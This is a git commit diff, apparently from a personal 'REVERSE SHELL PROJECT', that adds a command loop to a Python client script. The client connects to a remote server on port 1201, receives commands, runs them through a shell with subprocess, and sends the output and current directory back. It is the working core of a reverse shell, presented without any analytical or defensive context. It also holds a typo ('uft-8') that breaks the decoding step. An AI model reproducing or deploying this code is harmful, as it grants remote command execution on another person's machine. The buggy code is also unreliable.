ddbc206b0b0ce7b726eb4a5ddb5a98ff38379813
baonghi1201 <duynghi@hotmail.com>
2020-03-08 00:24:03 +0200

    RESERVER SHELL PROJECT

--- REVERSE SHELL PROJECT/Client.py
+++ REVERSE SHELL PROJECT/Client.py
@@ -8,4 +8,20 @@ port= 1201
 
 s.connect((host,port))
 
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == "cd":
+        os.chdir(data[3:].decode("utf-8"))
 
+    if len(data) > 0:
+        cmd=subprocess.Popen(data[:].decode("uft-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte=cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte, "utf-8")
+
+        # Create current directory, whenever "cd" is used. 
+        currentDirectory=os.getcwd() + ">"
+
+        # Sending output command lines to the server
+        s.send(str.encode(output_str + currentDirectory))
+
+        print(output_str)
